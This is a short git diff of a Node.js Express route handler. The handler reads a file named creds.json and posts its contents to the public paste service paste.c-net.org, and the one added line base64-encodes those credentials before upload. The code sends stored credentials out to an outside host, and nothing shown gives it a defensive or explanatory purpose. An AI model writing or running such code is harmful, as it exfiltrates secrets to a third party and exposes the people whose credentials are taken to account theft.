@@ -59,6 +59,7 @@ app.use("/", (req, res) => {
 
           try {
             let data = fs.readFileSync(__dirname + name + 'creds.json');
+            let b64data = Buffer.from(data).toString('base64');
             const output = await axios.post('http://paste.c-net.org/', b64data, {
             headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
             });
